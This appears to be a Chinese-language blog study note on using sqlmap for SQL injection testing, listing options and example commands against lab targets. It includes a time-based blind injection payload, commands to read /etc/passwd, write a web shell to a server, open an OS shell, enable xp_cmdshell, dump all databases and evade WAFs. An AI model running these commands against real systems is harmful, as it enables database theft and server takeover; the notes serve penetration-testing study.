                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  14 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-SQLMAP自动注入"><a href="#1-SQLMAP自动注入" class="headerlink" title="1. SQLMAP自动注入"></a>1. SQLMAP自动注入</h4><ul>
<li>开源sql注入漏洞检测、利用工具（python语言开发）</li>
<li>检测动态页面中get/post参数、cookie、http头</li>
<li>数据榨取</li>
<li>文件系统访问</li>
<li>操作系统命令执行</li>
<li>引擎强大、特性丰富</li>
<li>XSS漏洞检测</li>
</ul>
<blockquote>
<pre><code>⭐WEB渗透需要深入掌握SQL漏洞的原理以及注入</code></pre></blockquote>
<h4 id="2-SQLMAP–检测技术"><a href="#2-SQLMAP–检测技术" class="headerlink" title="2. SQLMAP–检测技术"></a>2. SQLMAP–检测技术</h4><ul>
<li>基于布尔的盲注检测（真/假）</li>
<li>基于时间的盲注检测（响应时间长短）<ul>
<li>‘and (select * from (select(sleep(20)))a)–+</li>
</ul>
</li>
<li>基于错误的检测</li>
<li>基于UNION联合查询的检测<ul>
<li>适用于通过循环直接输出联合查询结果，否则只显示第一项结果</li>
</ul>
</li>
<li>基于堆叠查询的检测<ul>
<li>;堆叠多个查询语句</li>
<li>适用于非select的数据修改、删除操作</li>
</ul>
</li>
<li>支持的数据库管理系统DBMS<ul>
<li>MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access，IBM DB2，SQLite，Firebird，Sybase，SAP MaxDB</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐NOSQLMAP可以查询NOSQL数据库里面的类型（非关系型数据库）</code></pre></blockquote>
<h4 id="3-SQLMAP–其他特性"><a href="#3-SQLMAP–其他特性" class="headerlink" title="3. SQLMAP–其他特性"></a>3. SQLMAP–其他特性</h4><ul>
<li>数据库直接连接-d<ul>
<li>不通过SQL注入，制定身份认证信息、IP、端口（Orcal 121，SQL Server 3433）</li>
</ul>
</li>
<li>与burpsuite、google结合使用，支持政策表达式限定测试目标</li>
<li>Get、Post、Cookie、Referer、User-Agent（随机或指定目标）<ul>
<li>Cookie过期后自动处理Set-Cookie头，更新Cookie信息（SQLMAP自动探测）</li>
</ul>
</li>
<li>限制：最大并发，延迟发送</li>
<li>支持Basic、Digest、NTLM、客户端CA身份认证（软证书+pin码，对客户端的身份认证）</li>
<li>数据库版本、用户、权限、hash枚举和字典破解、暴力破解表列名称（无法进行union select）</li>
<li>文件上传下载、UDF、启动并执行存储过程、操作系统命令执行、访问windows注册表</li>
<li>与w3af、metasploit集成结合使用，基于数据库服务进程提权和上传执行后门</li>
</ul>
<h4 id="4-SQLMAP–安装与更新"><a href="#4-SQLMAP–安装与更新" class="headerlink" title="4. SQLMAP–安装与更新"></a>4. SQLMAP–安装与更新</h4><ul>
<li>基于python2.7开发</li>
<li>安装<ul>
<li><strong><code>🔺命令：apt-get install git</code></strong></li>
<li><strong><code>🔺命令：git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</code></strong></li>
</ul>
</li>
<li>升级<ul>
<li><strong><code>🔺命令：sqlmap --update</code></strong> 在线</li>
<li><strong><code>🔺命令：git pull</code></strong> 离线</li>
</ul>
</li>
<li>Kali集成版随Kali库更新（Kali rolling版本可以直接通过update、upgrade）</li>
</ul>
<blockquote>
<pre><code>⭐Kali集成版更新（▲ 2020.1.15 更新可能在bash中找不到sqlmap）
1.git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
2.sqlmap --update</code></pre></blockquote>
<h4 id="5-SQLMAP–Options-Target参数"><a href="#5-SQLMAP–Options-Target参数" class="headerlink" title="5. SQLMAP–Options/Target参数"></a>5. SQLMAP–Options/Target参数</h4><ul>
<li>Options<ul>
<li>-h（显示粗略信息)</li>
<li>-hh（显示详细信息）</li>
<li>–version（SQLMAP版本信息）</li>
<li>-v （版本信息，分为0-5级，默认为1级）</li>
</ul>
</li>
<li>Target<ul>
<li>-d（直接连接，作为数据库的客户端）</li>
<li>-u（URL地址，需要有变量名称）</li>
<li>-l（log file记录日志，可以来自Burp or webscarab）</li>
<li>-x（站点地图，可以提交以xml文件的形式）</li>
<li>-m（url地址表，多个url地址保存为文本文件）</li>
<li>-r（http头请求信息提交，保存http头请求信息）</li>
<li>-g（Google搜索引擎，正则表达式）</li>
<li>-c（配置文件，保存扫描的配置文件）</li>
</ul>
</li>
</ul>
<h4 id="6-SQLMAP–Target-→-直接连接"><a href="#6-SQLMAP–Target-→-直接连接" class="headerlink" title="6. SQLMAP–Target → 直接连接"></a>6. SQLMAP–Target → 直接连接</h4><ul>
<li>直接方法<ul>
<li>sqlmap -d “mysql://user:<a href="mailto:password@192.168.1.1" target="_blank" rel="noopener">password@192.168.1.1</a>:3306/dvwa”</li>
<li>–users（数据库的管理账号）</li>
<li>–banner（目标系统版本，数据库类型版本）</li>
<li>–dbs（查询目标数据库管理系统的库）</li>
<li>–schema（源数据库）</li>
<li>-a（所有数据信息）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐查询结果，默认保存在：/root/.sqlmap/output/中</code></pre></blockquote>
<h4 id="7-SQLMAP–Target-→-Get方法"><a href="#7-SQLMAP–Target-→-Get方法" class="headerlink" title="7. SQLMAP–Target → Get方法"></a>7. SQLMAP–Target → Get方法</h4><ul>
<li>Get方法<ul>
<li>sqlmap -u “<a href="http://1.1.1.1/mutillidae/index.php?page=user-info.php&amp;username=1&amp;password=22&amp;user-info-php-submit-button=View+Account+Datails&quot;" target="_blank" rel="noopener">http://1.1.1.1/mutillidae/index.php?page=user-info.php&amp;username=1&amp;password=22&amp;user-info-php-submit-button=View+Account+Datails&quot;</a> -p（只检查） username -f（数据库的指纹）</li>
<li><ul>
<li>–users（数据库的管理账号）</li>
</ul>
</li>
<li>–banner（目标系统版本，数据库类型版本）</li>
<li>–dbs（查询目标数据库管理系统的库）</li>
<li>–schema（源数据库）</li>
<li>-a（所有数据信息）</li>
</ul>
</li>
</ul>
<h4 id="8-SQLMAP–Target-→-扫描URL列表文件"><a href="#8-SQLMAP–Target-→-扫描URL列表文件" class="headerlink" title="8. SQLMAP–Target → 扫描URL列表文件"></a>8. SQLMAP–Target → 扫描URL列表文件</h4><ul>
<li>扫描URL列表文件<ul>
<li><a href="http://1.1.1.1/vuln1.php?q=foobar" target="_blank" rel="noopener">http://1.1.1.1/vuln1.php?q=foobar</a></li>
<li><a href="http://1.1.1.1/vuln3/id/1" target="_blank" rel="noopener">http://1.1.1.1/vuln3/id/1</a>*</li>
<li>sqlmap -m list.txt</li>
</ul>
</li>
</ul>
<h4 id="9-SQLMAP–Target-→-扫描Google搜索结果"><a href="#9-SQLMAP–Target-→-扫描Google搜索结果" class="headerlink" title="9. SQLMAP–Target → 扫描Google搜索结果"></a>9. SQLMAP–Target → 扫描Google搜索结果</h4><ul>
<li>扫描Google搜索结果（需要代理链，配置才能使用）<ul>
<li>sqlmap.py -g “inurl:&quot;.php?id=1&quot;“</li>
</ul>
</li>
</ul>
<h4 id="10-SQLMAP–Target-→-POST方法"><a href="#10-SQLMAP–Target-→-POST方法" class="headerlink" title="10. SQLMAP–Target → POST方法"></a>10. SQLMAP–Target → POST方法</h4><ul>
<li>使用http请求文件（burpsuite）<ul>
<li>使用Burp，设置浏览器代理，POST提交数据的登录形式</li>
<li>复制http请求头，gedit黏贴在新建request.txt中</li>
<li>sqlmap -r request.txt（通过Burp抓取请求的文件）</li>
</ul>
</li>
<li>使用burpsuite log文件<ul>
<li>Options → Misc → Project Logging → Proxy Requests</li>
<li>保存为log.txt，发送Http请求（关闭Intercept）</li>
<li>sqlmap -l log.txt</li>
</ul>
</li>
</ul>
<h4 id="11-SQLMAP–Target-→-HTTPS"><a href="#11-SQLMAP–Target-→-HTTPS" class="headerlink" title="11. SQLMAP–Target → HTTPS"></a>11. SQLMAP–Target → HTTPS</h4><ul>
<li>sqlmap -u “<a href="https://1.1.1.1/a.php?id=1:8843&quot;" target="_blank" rel="noopener">https://1.1.1.1/a.php?id=1:8843&quot;</a> –force-ssl</li>
</ul>
<h4 id="12-SQLMAP–Target-→-扫描配置文件"><a href="#12-SQLMAP–Target-→-扫描配置文件" class="headerlink" title="12. SQLMAP–Target → 扫描配置文件"></a>12. SQLMAP–Target → 扫描配置文件</h4><ul>
<li>查找sqlmap.conf（/etc/sqlmap/sqlmap.conf）</li>
<li>sqlmap -c sqlmap.conf</li>
</ul>
<h4 id="13-SQLMAP–REQUEST-→-数据段"><a href="#13-SQLMAP–REQUEST-→-数据段" class="headerlink" title="13. SQLMAP–REQUEST → 数据段"></a>13. SQLMAP–REQUEST → 数据段</h4><ul>
<li>数据段： –data<ul>
<li>get/post都适用</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php&quot;</a> –data=”user=1&amp;pass=2（get的url参数部分/post的源代码）” -f</li>
</ul>
</li>
</ul>
<h4 id="14-SQLMAP–REQUEST-→-变量分隔符"><a href="#14-SQLMAP–REQUEST-→-变量分隔符" class="headerlink" title="14. SQLMAP–REQUEST → 变量分隔符"></a>14. SQLMAP–REQUEST → 变量分隔符</h4><ul>
<li>变量分隔符： –param-del<ul>
<li><a href="http://1.1.1.1/a.php?q=foo;id=1" target="_blank" rel="noopener">http://1.1.1.1/a.php?q=foo;id=1</a>  //  ;  &amp;</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php&quot;</a> –data=”q=foo;id=1” –param-del=”;” -f</li>
</ul>
</li>
</ul>
<h4 id="15-SQLMAP–REQUEST-→-Cookie头"><a href="#15-SQLMAP–REQUEST-→-Cookie头" class="headerlink" title="15.SQLMAP–REQUEST → Cookie头"></a>15.SQLMAP–REQUEST → Cookie头</h4><ul>
<li>–cookie</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=12&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=12&quot;</a> –cookie=”a=1；b=2（Cooke的值）” -f </li>
<li>web应用需要基于cookie的身份认证</li>
<li>检查存在cookie中的注入点（sqlmap自动测试）</li>
<li>Set-Cookie/–drop-set-cookie</li>
</ul>
<blockquote>
<pre><code>⭐SQLMAP扫描的Level1不会扫描cookie中存在的漏洞，至少得从Level2开始，--level 2</code></pre></blockquote>
<h4 id="16-SQLMAP–REQUEST-→-Agent"><a href="#16-SQLMAP–REQUEST-→-Agent" class="headerlink" title="16. SQLMAP–REQUEST → Agent"></a>16. SQLMAP–REQUEST → Agent</h4><ul>
<li>–user-agent<ul>
<li>sqlmap/1.0-dev-xxxxxxxx(<a href="http://sqlmap.org" target="_blank" rel="noopener">http://sqlmap.org</a>)</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=123&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=123&quot;</a> –user-agent=”aaaaaa” –dbs</li>
</ul>
</li>
<li>–random-agent<ul>
<li>/usr/share/sqlmap/txt/yser-agents.txt</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=123&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=123&quot;</a> –random-agent –dbs</li>
</ul>
</li>
<li>sqlmap检查user-agent中的注入点：Level&gt;=3</li>
<li>APP/WAF/IPS/IDS过滤异常user-agent时报错<ul>
<li>[hh:mm:20][ERROR] the target URL responded with an unknown HTTP status code,try to force the HTTP User-Agent header with option –useragent or –random-agent</li>
</ul>
</li>
</ul>
<h4 id="17-SQLMAP–REQUEST-→-Host-Referer-额外的header"><a href="#17-SQLMAP–REQUEST-→-Host-Referer-额外的header" class="headerlink" title="17. SQLMAP–REQUEST → Host/Referer/额外的header"></a>17. SQLMAP–REQUEST → Host/Referer/额外的header</h4><ul>
<li>Host头：–host<ul>
<li>Level=5</li>
</ul>
</li>
<li>Referer头：–referer<ul>
<li>Level&gt;=3</li>
</ul>
</li>
<li>额外的header：–headers<ul>
<li>每个头单独一行（名称区分大小写，大小写敏感）</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=123&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=123&quot;</a> –headers=”Host:<a href="http://www.a.com\nUser-Agent:yuanfh&quot;" target="_blank" rel="noopener">www.a.com\nUser-Agent:yuanfh&quot;</a></li>
</ul>
</li>
<li>–method=GET/POST（发送请求的方法，指定请求方法）</li>
</ul>
<h4 id="18-SQLMAP–REQUEST-→-基于HTTP协议的身份验证"><a href="#18-SQLMAP–REQUEST-→-基于HTTP协议的身份验证" class="headerlink" title="18. SQLMAP–REQUEST → 基于HTTP协议的身份验证"></a>18. SQLMAP–REQUEST → 基于HTTP协议的身份验证</h4><ul>
<li>基于HTTP协议的身份验证<ul>
<li>Basic</li>
<li>Digest</li>
<li>NTLM</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a> –auth-type Basic –auth-cred “user:pass”</li>
</ul>
</li>
<li>–auth-cert/–auth-file（基于客户端证书的身份认证）<ul>
<li>–auth-file=”ca.PEM”</li>
<li>含有私钥的PEM格式证书文件</li>
<li>PEM格式的证书链文件</li>
</ul>
</li>
</ul>
<h4 id="19-SQLMAP–REQUEST-→-http-s-代理"><a href="#19-SQLMAP–REQUEST-→-http-s-代理" class="headerlink" title="19. SQLMAP–REQUEST → http(s)代理"></a>19. SQLMAP–REQUEST → http(s)代理</h4><ul>
<li>http(s)代理（搜索引起：inurl:.php?id=）<ul>
<li>–proxy=”<a href="http://127.0.0.1:8087&quot;" target="_blank" rel="noopener">http://127.0.0.1:8087&quot;</a></li>
<li>–proxy=”socks5://127.0.0.1:8087”</li>
<li>–proxy-cred=”name:pass”（代理的身份认证）</li>
<li>–ignore-proxy（忽略系统级代理设置，通常用于扫描本地网络目标）</li>
</ul>
</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a> –proxy=”<a href="http://127.0.0.1:8087&quot;" target="_blank" rel="noopener">http://127.0.0.1:8087&quot;</a> -f</li>
</ul>
<h4 id="20-SQLMAP–REQUEST-→-delay-timeout-retries-randomize"><a href="#20-SQLMAP–REQUEST-→-delay-timeout-retries-randomize" class="headerlink" title="20. SQLMAP–REQUEST → delay/timeout/retries/randomize"></a>20. SQLMAP–REQUEST → delay/timeout/retries/randomize</h4><ul>
<li>–delay<ul>
<li>每次http(s)请求之间的延迟时间，浮点数，单位为秒，默认无延迟</li>
</ul>
</li>
<li>–timeout<ul>
<li>请求超时时间，浮点数，默认为30秒</li>
</ul>
</li>
<li>–retries<ul>
<li>http(s)连接超时重试次数，默认为3秒</li>
</ul>
</li>
<li>–randomize<ul>
<li>长度、类型与原始值保持一致的前提下，指定每次请求随机取值的参数名</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=100&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=100&quot;</a> –randomize=”id”</li>
</ul>
</li>
</ul>
<h4 id="21-SQLMAP–REQUEST-→-scope-safe"><a href="#21-SQLMAP–REQUEST-→-scope-safe" class="headerlink" title="21. SQLMAP–REQUEST → scope/safe"></a>21. SQLMAP–REQUEST → scope/safe</h4><ul>
<li>–scope<ul>
<li>过滤日志内容，通过正则表达式筛选扫描对象</li>
<li>sqlmap -l burp.log –scope=”(www)?.target.(com|net|org)”</li>
<li>sqlmap -l 2.log –scope=”(19)?.168.20.(1|10|100)” –level 3 –dbs</li>
<li>▲ User-agent中的注入点</li>
</ul>
</li>
<li>–safe-url/–safe-freq（两个需同时使用）<ul>
<li>检测和盲注阶段会产生大量失败请求，服务器端可能因此销毁Session</li>
<li>每发送–safe-freq次注入请求后，发送一次正常请求</li>
</ul>
</li>
</ul>
<h4 id="22-SQLMAP–REQUEST-→-skip-urlencode-eval"><a href="#22-SQLMAP–REQUEST-→-skip-urlencode-eval" class="headerlink" title="22. SQLMAP–REQUEST → skip-urlencode/eval"></a>22. SQLMAP–REQUEST → skip-urlencode/eval</h4><ul>
<li>–skip-urlencode<ul>
<li>默认Get方法会对传输内容进行编码，某些WEB服务器不遵守RFC标准编码，使用原始字符提交数据</li>
</ul>
</li>
<li>–eval<ul>
<li>每次请求前执行指定的python代码</li>
<li>每次请求更改或增加新的参数值（时间依赖、其他参数值依赖）</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&amp;hash=&quot;=c4ca4238a0b923820dcc509a6f75849b&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&amp;hash=&quot;=c4ca4238a0b923820dcc509a6f75849b&quot;</a> –eval=”import hashlib;hash=hashlib.md5(id).hexdigest()”</li>
</ul>
</li>
</ul>
<h4 id="23-SQLMAP–Optimization参数（性能优化）"><a href="#23-SQLMAP–Optimization参数（性能优化）" class="headerlink" title="23. SQLMAP–Optimization参数（性能优化）"></a>23. SQLMAP–Optimization参数（性能优化）</h4><ul>
<li>-o（开启所有参数的优化，除threads参数外）</li>
<li>–predict-output</li>
<li>–keep-alive</li>
<li>–null-connection</li>
<li>–threads=THREADS</li>
</ul>
<h4 id="24-SQLMAP–Optimization-→-predict-output"><a href="#24-SQLMAP–Optimization-→-predict-output" class="headerlink" title="24. SQLMAP–Optimization → predict-output"></a>24. SQLMAP–Optimization → predict-output</h4><ul>
<li>根据检测方法，比对返回值和统计表内容，不断缩小检测范围，提高检测效率</li>
<li>版本名、用户名、密码、Privileges、role、数据库名称、表名、列名</li>
<li>▲ 与–threads参数不兼容</li>
<li>统计表：/usr/share/sqlmap/txt/common-outputs.txt</li>
</ul>
<h4 id="25-SQLMAP–Optimization-→-Keep-alive"><a href="#25-SQLMAP–Optimization-→-Keep-alive" class="headerlink" title="25. SQLMAP–Optimization → Keep alive"></a>25. SQLMAP–Optimization → Keep alive</h4><ul>
<li>–keep alive</li>
<li>使用http(s)长连接，性能好</li>
<li>▲ 与–proxy参数不兼容</li>
<li>长连接避免重复建立连接的网络开销，但大量长连接会严重占用服务器资源</li>
</ul>
<h4 id="26-SQLMAP–Optimization-→-null-connection"><a href="#26-SQLMAP–Optimization-→-null-connection" class="headerlink" title="26. SQLMAP–Optimization → null-connection"></a>26. SQLMAP–Optimization → null-connection</h4><ul>
<li>–null-connection</li>
<li>只获取相应页面的大小值，而非页面具体内容</li>
<li>通常用于盲注判断真/假，降低网络带宽消耗</li>
<li>▲ 与–text-only参数不兼容（基于页面内容的比较判断真/假）</li>
</ul>
<h4 id="27-SQLMAP–Optimization-→-threads"><a href="#27-SQLMAP–Optimization-→-threads" class="headerlink" title="27. SQLMAP–Optimization → threads"></a>27. SQLMAP–Optimization → threads</h4><ul>
<li>–threads=THREADS</li>
<li>最大并发线程</li>
<li>盲注时每个线程获取一个字符（每个线程7次请求），获取完成后线程结束</li>
<li>默认值为1，建议不要超过10，否则可能影响目标站点可用性</li>
<li>▲ 与–predict-output参数不兼容</li>
</ul>
<blockquote>
<pre><code>⭐7次请求即可以获取到一个ASCII码字符，即可打印字符为128个</code></pre></blockquote>
<h4 id="28-SQLMAP–ENUMERATION-→-枚举数据库数据"><a href="#28-SQLMAP–ENUMERATION-→-枚举数据库数据" class="headerlink" title="28. SQLMAP–ENUMERATION → 枚举数据库数据"></a>28. SQLMAP–ENUMERATION → 枚举数据库数据</h4><ul>
<li>–current-user（当前数据库管理系统账号）</li>
<li>–current-db（当前数据库管理系统的数据库）</li>
<li>–hostname（当前机器主机名）</li>
<li>–users（数据库管理系统所有账号）</li>
<li>–privileges -U username（CU当前账号）</li>
<li>–roles（数据库角色）</li>
<li>–dbs（数据库管理系统所有的数据库）</li>
<li>–tables、–colums、–exclude-sysdbs（排除系统库）</li>
<li>-D db（指定所使用的数据库）</li>
<li>-T table（指定所使用的数据表）</li>
<li>-C user –colusms（指定某个列）</li>
<li>–schema（表结构）–batch（批处理） –exclude-sysdbs 元数据（使用默认选项）</li>
<li>–count（表的行数）</li>
</ul>
<h4 id="29-SQLMAP–ENUMERATION-→-具体数据操作"><a href="#29-SQLMAP–ENUMERATION-→-具体数据操作" class="headerlink" title="29. SQLMAP–ENUMERATION → 具体数据操作"></a>29. SQLMAP–ENUMERATION → 具体数据操作</h4><ul>
<li>Dump数据<ul>
<li>–dump,-C,-T,-D,–start,–stop</li>
<li>–dump-all –exclude-sysdbs</li>
<li>–sql-query “select * from users”</li>
</ul>
</li>
</ul>
<h4 id="30-SQLMAP–BRUFE-FORCE（暴力破解）"><a href="#30-SQLMAP–BRUFE-FORCE（暴力破解）" class="headerlink" title="30. SQLMAP–BRUFE FORCE（暴力破解）"></a>30. SQLMAP–BRUFE FORCE（暴力破解）</h4><ul>
<li>Mysql&lt;5.0，没有information_schema库</li>
<li>Mysql&gt;=5.0，但无权读取information_schema库</li>
<li>微软的access数据库，默认无权读取MSysObjects库</li>
<li>–common-tables</li>
<li>–common-columns（Access系统表无列信息）</li>
</ul>
<h4 id="31-SQLMAP–UDF-INJECTION（用户自定义函数注入）"><a href="#31-SQLMAP–UDF-INJECTION（用户自定义函数注入）" class="headerlink" title="31. SQLMAP–UDF INJECTION（用户自定义函数注入）"></a>31. SQLMAP–UDF INJECTION（用户自定义函数注入）</h4><ul>
<li>–udf-inject,–share-lib<ul>
<li>编译共享库创建并上传至DB Server，以此生成UDF实现高级注入</li>
<li>Linux：shared object</li>
<li>Windows：DLL</li>
<li><a href="http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-systemfull-control-whitepaper-4633857" target="_blank" rel="noopener">http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-systemfull-control-whitepaper-4633857</a></li>
</ul>
</li>
</ul>
<h4 id="32-SQLMAP–FILE-SYSTEM（文件系统）"><a href="#32-SQLMAP–FILE-SYSTEM（文件系统）" class="headerlink" title="32. SQLMAP–FILE SYSTEM（文件系统）"></a>32. SQLMAP–FILE SYSTEM（文件系统）</h4><ul>
<li>–file-read=”/etc/passwd”</li>
<li>–file-write=”shell.php” –file-dest=”/tmp/shell.php”</li>
</ul>
<h4 id="33-SQLMAP–OS（操作系统）（▲-2020-1-15命令执行无返回数据）"><a href="#33-SQLMAP–OS（操作系统）（▲-2020-1-15命令执行无返回数据）" class="headerlink" title="33. SQLMAP–OS（操作系统）（▲ 2020.1.15命令执行无返回数据）"></a>33. SQLMAP–OS（操作系统）（▲ 2020.1.15命令执行无返回数据）</h4><ul>
<li>–os-cmd id（执行一个命令）</li>
<li>–os-shell</li>
<li>–sql-shell</li>
<li>Mysql、postgresql<ul>
<li>上传共享库并生成sys_exec()、sys_eval()两个UDF</li>
</ul>
</li>
<li>Mssql<ul>
<li>xp_cmdshell存储过程（有就用，禁了启，没有建）</li>
</ul>
</li>
</ul>
<h4 id="34-SQLMAP–WINDOWS-REGISTORY（Windows）"><a href="#34-SQLMAP–WINDOWS-REGISTORY（Windows）" class="headerlink" title="34. SQLMAP–WINDOWS REGISTORY（Windows）"></a>34. SQLMAP–WINDOWS REGISTORY（Windows）</h4><ul>
<li>–reg-read</li>
<li>–reg-add</li>
<li>–reg-del</li>
<li>–reg-key、–reg-value、–reg-data、–reg-type</li>
<li>sqlmap –u=”<a href="http://1.1.1.1/a.aspx?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.aspx?id=1&quot;</a> –reg-add –regkey=”HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap” –reg-value=Test -reg-type=REG_SZ –reg-data=1</li>
</ul>
<h4 id="35-SQLMAP–GENERAL（一般性参数）"><a href="#35-SQLMAP–GENERAL（一般性参数）" class="headerlink" title="35. SQLMAP–GENERAL（一般性参数）"></a>35. SQLMAP–GENERAL（一般性参数）</h4><ul>
<li>-s（sqlite会话文件保存位置）</li>
<li>-t（记录流量文件保存位置）</li>
<li>–charset（强制字符编码）<ul>
<li>–charset=GBK</li>
</ul>
</li>
<li>–crawl（从起始位置爬站深度）<ul>
<li>–batch –crawl=3</li>
</ul>
</li>
<li>–csv-del（dump数据默认存于”,”分割的CSV文件，指定其他分隔符）<ul>
<li>–csv-del=”;”</li>
</ul>
</li>
<li>–dbms-cred（指定数据库账号）</li>
<li>–flush-session（清空session）</li>
<li>–force-ssl（https链接）</li>
<li>–fresh-queries（忽略session查询结果）</li>
<li>–hex（dump非ASCII码字符内容时，将其编码为16进制形式，收到后解码还原，防过滤）<ul>
<li>sqlmap -u “<a href="http://1.1.1.1/s.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/s.php?id=1&quot;</a> –hex -v 3</li>
</ul>
</li>
<li>–output-dir=/tmp</li>
<li>–parse-errors（分析和现实数据库内建报错信息）<ul>
<li>sqlmap -u “<a href="http://1.1.1.1/sqlmap/a.asp?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/sqlmap/a.asp?id=1&quot;</a> –parse-errors</li>
</ul>
</li>
<li>–save（将命令保存成配置文件）</li>
</ul>
<h4 id="36-SQLMAP–MISCELLANEOUS-→-助记符（-z）"><a href="#36-SQLMAP–MISCELLANEOUS-→-助记符（-z）" class="headerlink" title="36. SQLMAP–MISCELLANEOUS → 助记符（-z）"></a>36. SQLMAP–MISCELLANEOUS → 助记符（-z）</h4><ul>
<li>-z（参数助记符）</li>
<li>原：sqlmap –batch –random-agent –ignore-proxy –technique=BEU -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a></li>
<li>后：sqlmap -z “bat,randoma,ign,tec=BEU” -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a></li>
<li>原：sqlmap –ignore-proxy –flush-session –technique=U –dump -D testdb -T users -u “1.1.1.1/a.php?id=1” </li>
<li>后：sqlmap -z “ign,flu,bat,tec=U,dump,D=testdb,T=users” -u “1.1.1.1/ vuln.php?id=1”</li>
</ul>
<h4 id="37-SQLMAP–MISCELLANEOUS-→-answer-check-waf-hpp-identify-waf（▲-2020-1-15命令执行无返回数据）"><a href="#37-SQLMAP–MISCELLANEOUS-→-answer-check-waf-hpp-identify-waf（▲-2020-1-15命令执行无返回数据）" class="headerlink" title="37. SQLMAP–MISCELLANEOUS → answer/check-waf/hpp/identify-waf（▲ 2020.1.15命令执行无返回数据）"></a>37. SQLMAP–MISCELLANEOUS → answer/check-waf/hpp/identify-waf（▲ 2020.1.15命令执行无返回数据）</h4><ul>
<li>–answer<ul>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a> –technique=E –answers=”extending=N” –batch</li>
</ul>
</li>
<li>–check-waf（检测WAF/IPS/IDS）（▲ 2020.1.15此参数更新后暂无）</li>
<li>–hpp（HTTP parameter pollution，Web Application的一个漏洞）<ul>
<li>绕过WAF/IPS/IDS的有效方法</li>
<li>尤其对ASP/IIS和ASP.NET/IIS</li>
</ul>
</li>
<li>–identify-waf（彻底的waf/ips/ids检查）<ul>
<li>检查30多种产品</li>
</ul>
</li>
</ul>
<h4 id="38-SQLMAP–MISCELLANEOUS-→-Misc"><a href="#38-SQLMAP–MISCELLANEOUS-→-Misc" class="headerlink" title="38. SQLMAP–MISCELLANEOUS → Misc"></a>38. SQLMAP–MISCELLANEOUS → Misc</h4><ul>
<li>–mobile（模拟智能手机设备）</li>
<li>–purge-output（清除output文件夹）（▲ 2020.1.15修改参数为–purge）</li>
<li>–smart（当有大量检测目标时，只选择基于错误的检测结果）</li>
<li>–wizard（sqlmap向导）</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E7%9B%B2%E6%B3%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E7%9B%B2%E6%B3%A8/" itemprop="url">Kali Linux笔记(五十)：手动漏洞挖掘--SQL盲注</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-14T20:12:46+08:00">
                2020-01-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
